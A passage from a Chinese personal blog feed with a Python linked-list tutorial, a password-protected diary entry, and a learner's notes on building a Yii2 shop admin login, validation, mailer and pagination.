class="line">            count = <span class="number">0</span></span><br><span class="line">            node = Node(item)</span><br><span class="line">            <span class="keyword">while</span> count &lt; pos<span class="number">-1</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                pre = pre.next</span><br><span class="line">            node.next = pre.next</span><br><span class="line">            pre.next = node</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(self, item)</span>:</span> <span class="comment">#默认删除一个找到的节点</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        pre = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item: <span class="comment">#找到了的话</span></span><br><span class="line">                <span class="comment">#判断是否为头结点</span></span><br><span class="line">                  <span class="keyword">if</span> cur == self.__head:</span><br><span class="line">                      self.__head = cur.next</span><br><span class="line">                  <span class="keyword">else</span>:</span><br><span class="line">                      pre.next = cur.next</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = cur</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self,item)</span>:</span> <span class="comment"># 查找元素</span></span><br><span class="line">        cur = self.__head</span><br><span class="line">        <span class="keyword">while</span> cur <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> cur.elem == item:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cur = cur.next</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># test_1</span></span><br><span class="line">    lst = SingleLinklist()</span><br><span class="line">    print(lst.is_empty())</span><br><span class="line">    print(lst.length())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_2</span></span><br><span class="line">    lst.append(<span class="number">2</span>)</span><br><span class="line">    lst.add(<span class="number">3</span>) <span class="comment"># 3 2</span></span><br><span class="line">    lst.insert(<span class="number">1</span>, <span class="number">5</span>)   <span class="comment"># 3  1  5 2</span></span><br><span class="line">    lst.add(<span class="number">4</span>)    <span class="comment"># 4 3  5 2</span></span><br><span class="line">    lst.append(<span class="number">6</span>)  <span class="comment"># 4 3  5 2 6</span></span><br><span class="line">    print(lst.search(<span class="number">5</span>))</span><br><span class="line">    lst.travel()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># test_3 </span></span><br><span class="line">    lst.remove(<span class="number">5</span>)</span><br><span class="line">    lst.remove(<span class="number">4</span>)</span><br><span class="line">    lst.remove(<span class="number">6</span>)</span><br><span class="line">    lst.travel()</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总体感觉在写单链表的时候要注意几个问题，注意要多考虑一下几种典型的情况，比如空链表，只有一个节点的时候，或者是最后一个节点的情况等等。。。第二的话还是要注意一下变量的赋值，这东西很容易写着写着脑子就抽了，然后就会出现溢出的情况额。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;复习一下数据结构，感觉生疏了，用python重新写一遍吧&lt;br&gt;
    
    </summary>
    
      <category term="编程语言" scheme="0verwatch.top/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
      <category term="python" scheme="0verwatch.top/tags/python/"/>
    
      <category term="编程语言" scheme="0verwatch.top/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
      <category term="数据结构" scheme="0verwatch.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>两年</title>
    <link href="0verwatch.top/2018/06/08/writing-1/"/>
    <id>0verwatch.top/2018/06/08/writing-1/</id>
    <published>2018-06-08T11:33:07.000Z</published>
    <updated>2018-06-08T14:42:56.457Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      随笔
    
    </summary>
    
      <category term="随笔" scheme="0verwatch.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="0verwatch.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>编写Yii框架项目时出现的问题</title>
    <link href="0verwatch.top/2018/06/06/Yii-probleam/"/>
    <id>0verwatch.top/2018/06/06/Yii-probleam/</id>
    <published>2018-06-06T11:47:27.000Z</published>
    <updated>2018-06-06T11:53:55.800Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下编写Yii框架中项目的问题，也可以说是边学习边记录，有点乱，但是自己看得懂就好</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="web应用根目录下"><a href="#web应用根目录下" class="headerlink" title="web应用根目录下"></a>web应用根目录下</h3><p>   <code>asset</code>包含yii发布的各种资源文件包括js和css</p><p>多用公共模板文件去加载，不多过多去冗余，注意在<code>views</code>文件夹下创建跟<code>controller</code>一样名字的视图文件夹</p><p>注意在某些资源文件调进asset文件夹的时候需要修改路径，一般都是要搜索像<code>img script css</code>之类的关键字</p><h3 id="复习一下循环将所有内容输出的格式"><a href="#复习一下循环将所有内容输出的格式" class="headerlink" title="复习一下循环将所有内容输出的格式"></a>复习一下循环将所有内容输出的格式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">foreach</span>($a <span class="keyword">as</span> $b): <span class="meta">?&gt;</span></span><br><span class="line">&lt;td&gt; </span><br><span class="line"> <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $b;<span class="meta">?&gt;</span> </span><br><span class="line">&lt;/td&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">     <span class="comment">//把各部分元素输出就好，这里不一定单单就是$b,也可能是$b-&gt;某个元素</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endforeach</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在新建modules时候我们需要<code>gii脚手架</code>的帮助，这个选项在<code>web.php</code>里面，一般默认开启，需要对他有权限就需要加上你的ip，添加一个<code>allowedIPs</code>选项，如下图<br><img src="https://s1.ax1x.com/2018/06/06/CHkkad.png" alt="CHkkad.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkAIA.png" alt="CHkAIA.png"><br><img src="https://s1.ax1x.com/2018/06/06/CHkVPI.png" alt="CHkVPI.png"></p><h3 id="新建的modules"><a href="#新建的modules" class="headerlink" title="新建的modules"></a>新建的modules</h3><p>这相当于一个小型的Yii框架我感觉。。。。里面也有一个小型的mvc<br>然后我们还需要在<code>web.php</code>加上相应的<code>modules</code>模块<br><img src="https://s1.ax1x.com/2018/06/06/CHkKsS.png" alt="CHkKsS.png"><br>他好像默认调用的布局文件好像是view里面的<code>layouts/main.php</code><br>自己调一下就好了</p><p>另外填写命名空间的时候还需要改一下<code>namespace app\modules\controllers;</code>相当于增加了<code>modules</code></p><p>Yii2下的文件一般都是框架重要的配置文件，我们可以在里面的<code>web/application</code> 找到<code>public defaultRoute</code>是指定默认的主页路径的，一般最后开发的时候会把原来的布局给删掉，所以这个参数一般要改，但是我们不会选择直接改，改了Yii框架源码最后检错的时候会有点艰难，而是在<code>web.php</code>这个配置文件中修改，直接添加对应的参数名字就好，如下图<br><img src="https://s1.ax1x.com/2018/06/06/CHkuM8.png" alt="CHkuM8.png"></p><h3 id="创建SQL文件"><a href="#创建SQL文件" class="headerlink" title="创建SQL文件"></a>创建SQL文件</h3><p>这里的comment后面的内容是说明，这里还学到一种使用数据库的新模式，UNIQUE约束，这个东西相当于设定一个对应的SET查询，我猜中间那里应该是<code>SQL约束</code>的名字</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span><span class="string">`shop_admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span><span class="string">`shop_admin`</span>(</span><br><span class="line"><span class="string">`adminid`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENTCOMMENT<span class="string">'主键ID'</span>,</span><br><span class="line"><span class="string">`adminuser`</span><span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员帐号'</span>,</span><br><span class="line"><span class="string">`adminpass`</span><span class="built_in">CHAR</span>(<span class="number">32</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员密码'</span>,</span><br><span class="line"><span class="string">`adminemail`</span><span class="built_in">VARCHAR</span>(<span class="number">50</span>)<span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span><span class="string">'管理员邮箱'</span>,</span><br><span class="line"><span class="string">`logintime`</span><span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'登录时间'</span>,</span><br><span class="line"><span class="string">`loginip`</span> <span class="built_in">BIGINT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'登录IP'</span>,</span><br><span class="line"><span class="string">`createtime`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span><span class="string">'创建时间'</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span>(<span class="string">`adminid`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminpass(<span class="string">`adminuser`</span>,<span class="string">`adminpass`</span>),</span><br><span class="line"><span class="keyword">UNIQUE</span> shop_admin_adminuser_adminemail(<span class="string">`adminuser`</span>,<span class="string">`adminemail`</span>)</span><br><span class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span><span class="string">`shop_admin`</span>(adminuser,adminpass,adminemail,createtime)<span class="keyword">VALUES</span>(<span class="string">'admin'</span>,<span class="keyword">md5</span>(<span class="string">'123'</span>),<span class="string">'test@163.com'</span>,<span class="keyword">UNIX_TIMESTAMP</span>());</span><br></pre></td></tr></table></figure><p>然后导进数据库文件<br>注意字节的数据库文件名的列名是否一致，我他么找了很久才找到自己哪里错了</p><p>在后台创建models模块，一般不要选择直接在大框架下的models文件夹创建，因为我们得将后天跟前台分离开，别让它们互相影响。。</p><p>一般情况下创建的数据库的类名跟表名一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">ActiveRecord</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">ActiveRecord</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">tableName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"&#123;&#123;%admin&#125;&#125;"</span>;     <span class="comment">//这里不用shop_前缀是因为我们在配置数据库文件已把前缀给设定好，可以用左面的方式去写</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后再在对应的登录页面去把对应的类给调用，并且创建，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">namespace</span>  <span class="title">app</span>\<span class="title">modules</span>\<span class="title">controllers</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line">   <span class="keyword">use</span> <span class="title">app</span>\<span class="title">modules</span>\<span class="title">models</span>\<span class="title">Admin</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">PublicController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class">   </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionLogin</span><span class="params">()</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span> -&gt;layout = <span class="keyword">false</span>;</span><br><span class="line">           $models = <span class="keyword">new</span> Admin;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">"login"</span>,[<span class="string">'models'</span>=&gt;$models]); <span class="comment">//一定要注意返回，经常忘记</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后去到后台登录页面的HTML代码，首行加载</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">use</span> <span class="title">yii</span>\<span class="title">bootstrap</span>\<span class="title">ActiveForm</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个类有帮助创建<code>form组件</code><br>然后在对应部分添加相应的代码</p><h3 id="表单操作对应文章"><a href="#表单操作对应文章" class="headerlink" title="表单操作对应文章"></a>表单操作对应文章</h3><p><a href="http://www.jb51.net/article/77754.htm" target="_blank" rel="noopener">http://www.jb51.net/article/77754.htm</a></p><p>然后我们把对应的静态的input标签给删除掉，还有对应的说明也给删掉,下面再讲<br>注意他们对应的类型去修改，这里是因为<code>’记住我‘</code>的那一个选项引出来的点，因为他的类型是CheckBox，并且一般来说field函数的第二个参数一般是默认以数据库里面的字段去设置的，所以不存在记住我的这一个选项，我们还需要在models里面添加一个参数<code>rememberMe</code>设定为true就是默认勾选的。。。但是这个<code>CheckBox</code>的复杂性，还存在div属性，于是我们既可以利用yii框架提供给我们的template去完成，所以单独有input属性就比较简单点，直接就是在某在类型的标签里写上对应的东西即可</p><p>在提交按钮下，这里就不适用field函数了，用另外的方法实现，用的是Html的类，其实写法也差不多</p><p>首先我们得在前面添加相应的模块，这里一定要记得，我这里忘了调了很久<br> <code>use yii\Helpers\Html;</code><br> 对比一下就知道怎么写了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">"登录"</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;aclass=<span class="string">"btn-glowprimarylogin"</span>href=<span class="string">"index.html"</span>&gt;登录&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>到最后还得把刚才多出来的标签给弄掉，但是我们每个区添加template就会很烦，所以<br>我们直接在begin那部分实现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最终效果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $form=ActiveForm::begin([</span><br><span class="line"><span class="string">'fieldConfig'</span>=&gt;[</span><br><span class="line"><span class="string">'template'</span>=&gt;<span class="string">'&#123;input&#125;'</span></span><br><span class="line">]</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;div class="span4box"&gt;</span><br><span class="line">&lt;div class="content-wrap"&gt;</span><br><span class="line">&lt;h6&gt;二手商城-后台管理&lt;/h6&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminuser'</span>)-&gt;textInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">"管理员帐号"</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'adminpass'</span>)-&gt;passwordInput([<span class="string">"class"</span>=&gt;<span class="string">"span12"</span>,<span class="string">"placeholder"</span>=&gt;<span class="string">'管理员密码'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;a href="#"class="forgot"&gt;忘记密码?&lt;/a&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $form-&gt;field($models,<span class="string">'rememberMe'</span>)-&gt;checkbox([</span><br><span class="line"><span class="string">"id"</span>=&gt;<span class="string">"remember-me"</span>,</span><br><span class="line"><span class="string">"template"</span>=&gt;<span class="string">"&lt;div class=\"remember\"&gt;&#123;input&#125;&lt;labelfor=\"remember-me\"&gt;记住我&lt;/label&gt;&lt;/div&gt;"</span>,</span><br><span class="line">]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> Html::submitButton(<span class="string">'登录'</span>,[<span class="string">"class"</span>=&gt;<span class="string">"btn-glowprimarylogin"</span>,]);<span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> ActiveForm::end();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>管理后台不需要注册，记得要删除，否则出啥问题后果自负了，hiahia<br>注意这里的<code>models</code>要对应你在<code>render</code>里面的<code>‘models’</code>参数</p><p>对于后台登录页面注意接收数据的页面，然后我们在里面利用yii框架的request模块了，千万要记得记得前面加上use Yii,<br>我们就可以在下面用这样的语句去判断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(Yii::$app-&gt;request-&gt;isPost)</span><br></pre></td></tr></table></figure><p>我们还可以利用定义函数<code>rules</code>去定义规则，这个规则在调用<code>validate</code>的时候会调用<br>详情可以看一下下面的链接<br><a href="https://blog.csdn.net/luze_1226/article/details/65633923" target="_blank" rel="noopener">https://blog.csdn.net/luze_1226/article/details/65633923</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>[</span><br><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员账号不能为空'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员密码不能为空'</span>],</span><br><span class="line">[<span class="string">'rememberMe'</span>,<span class="string">'boolean'</span>],</span><br><span class="line">[<span class="string">'adminpass'</span>,<span class="string">'validatePass'</span>],</span><br><span class="line">];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但密码检验没有对应的方法，所以得自定义一个<code>validatePass</code>，也就是说规则是有一部分可以自定义的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validatePass</span><span class="params">()</span> //数据的验证</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;hasErrors())</span><br><span class="line">                &#123;</span><br><span class="line">                    $data = <span class="keyword">self</span>::find()-&gt;where(<span class="string">'adminuser=:user and adminpass=:pass'</span>,[<span class="string">":user"</span>=&gt;<span class="keyword">$this</span>-&gt;adminuser,<span class="string">":pass"</span>=&gt;md5(<span class="keyword">$this</span>-&gt;adminpass)])-&gt;one();</span><br><span class="line">                    <span class="keyword">if</span>(isNull($data)) <span class="comment">//判断数据是否为空</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;addError(<span class="string">"adminpass"</span>,<span class="string">"用户名或者密码错误！"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>这样login里面就可以做点有意义的事情了，但是如果想让后台页面显示错误信息的话我们只需要在模板文件里面的begin里面的<code>template</code>的<code>{input}</code>的前面或者后面添加<code>{error}</code>即可，位置任选哪里好看放哪里</p><h3 id="生成动态url"><a href="#生成动态url" class="headerlink" title="生成动态url"></a>生成动态url</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&lt;?php  echo yii\Helpers\Url::to(['public/logout']); ?&gt;"</span> role=<span class="string">"button"</span>&gt;</span><br></pre></td></tr></table></figure><p> <code>Yii::$app-&gt;end();</code>这句在跳转之后的作用看一看下面这个网址，相当于die操作<br><a href="http://www.yiichina.com/question/2182" target="_blank" rel="noopener">http://www.yiichina.com/question/2182</a></p><p>在某个models里的这个东西<code>if($this-&gt;load($data)&amp;&amp; $this-&gt;validate())</code><br>可以看下面的链接<a href="http://www.yiichina.com/question/955" target="_blank" rel="noopener">http://www.yiichina.com/question/955</a><br>先是<code>load</code>是填充规则里面的东西，而<code>validate</code>就是用来检查规则的<br>但是一旦rules规则多起来，调用的时候会把规则里面的东西全检查一遍，非常耗时。。此时要增加场景来提高效率<br>在每个自定义的检查函数里面添加<code>$this-&gt;scenario = &quot;yourname&quot;</code>,并且在规则里面添加<code>on</code>参数去规定场景<br>如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'adminuser'</span>,<span class="string">'required'</span>,<span class="string">'message'</span>=&gt;<span class="string">'管理员账号不能为空'</span>,<span class="string">'on'</span>=&gt;[<span class="string">'login'</span>,<span class="string">'seekpass'</span>]]</span><br></pre></td></tr></table></figure><h3 id="Email发送类操作"><a href="#Email发送类操作" class="headerlink" title="Email发送类操作"></a>Email发送类操作</h3><p>在web.php里面找到mailer这个选项，这个东西就是对email发送的设置、邮箱的配置详情看<br><a href="https://blog.csdn.net/cjqh_hao/article/details/48501897" target="_blank" rel="noopener">https://blog.csdn.net/cjqh_hao/article/details/48501897</a><br><a href="http://www.yiichina.com/tutorial/320" target="_blank" rel="noopener">http://www.yiichina.com/tutorial/320</a></p><p>还要记得配置里面的password填写的是授权密码啊。。。。。。真心累这东西，解决方案<br><a href="http://www.yii-china.com/post/detail/10.html" target="_blank" rel="noopener">http://www.yii-china.com/post/detail/10.html</a></p><p>注意在发送邮件的函数中也就是mailer函数调用<code>compose</code>参数的<code>view</code>参数千万不能忘记，一定要在mail文件夹下新建你对应的视图文件，不要像我一样直接在layouts里面新建了。。。而且这里面的内容就是你发送邮件的内容，里面有个函数也要注意一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yii::$app-&gt;session-&gt;setFlash(<span class="string">'info'</span>,<span class="string">'电子邮件已经发送成功，请查收'</span>);</span><br></pre></td></tr></table></figure><p>这句话不要忘记在对应的视图文件里面加上，我自己是public下面的seekpassword.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(Yii::$app-&gt;session-&gt;hasFlash(<span class="string">'info'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> Yii::$app-&gt;session-&gt;getFlash(<span class="string">'info'</span>);</span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>不然不会出现成功的信息的，这里真的是对yii框架太不熟悉了，只能在项目完成过程中慢慢摸索</p><h3 id="分页处理"><a href="#分页处理" class="headerlink" title="分页处理"></a>分页处理</h3><p>运用了yii框架下的的一个组件<br>在对应的控制器里面加上<code>use yii\data\Pagination;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$model = Admin::find();</span><br><span class="line">           $count = $model-&gt;count();</span><br><span class="line">           $pageSize = Yii::$app-&gt;params[<span class="string">'pageSize'</span>][<span class="string">'manage'</span>];</span><br><span class="line">           $pager = <span class="keyword">new</span> Pagination([<span class="string">'totalCount'</span>=&gt; $count, <span class="string">'pageSize'</span>=&gt; $pageSize]);</span><br><span class="line">           $managers = $model-&gt;offset($pager-&gt;offset)-&gt;limit($pager-&gt;limit)-&gt;all();</span><br><span class="line">   